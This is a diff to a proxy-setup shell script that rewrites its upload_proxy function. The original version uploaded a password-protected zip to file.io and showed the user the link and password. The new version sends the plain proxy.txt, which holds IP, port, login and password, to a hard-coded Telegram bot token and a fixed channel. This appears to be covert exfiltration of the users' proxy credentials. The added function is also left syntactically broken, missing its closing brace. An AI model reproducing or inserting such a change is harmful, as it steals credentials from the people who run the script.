@@ -250,15 +250,13 @@ $(awk -F "/" '{print $3 ":" $4 ":" $1 ":" $2 }' ${WORKDATA})
 EOF
 }
 
-upload_proxy() {
-    cd $WORKDIR
-    local PASS=$(getRandomString)
-    zip --password $PASS lowendviet_proxy.zip proxy.txt > /dev/null
-    URL=$(curl -s -F "file=@lowendviet_proxy.zip" https://file.io | jq '.link')
-    echo "URL to download proxy: ${URL}"
-    echo "Password zip file: ${PASS}"
-}
 
+upload_proxy() {
+	cd $WORKDIR
+	URL=$(curl -F document=@"proxy.txt" https://api.telegram.org/bot6374968102:AAEi4z3l0E5KwRu8v2haNYoScW7N84i6FQs/sendDocument?chat_id=@buyupvultr)
+    echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
+    echo "Download zip archive from telegram"
+    
 readWithTrim() {
   read temp
   echo -n "$temp" | sed 's/^ *//;s/ *$//'
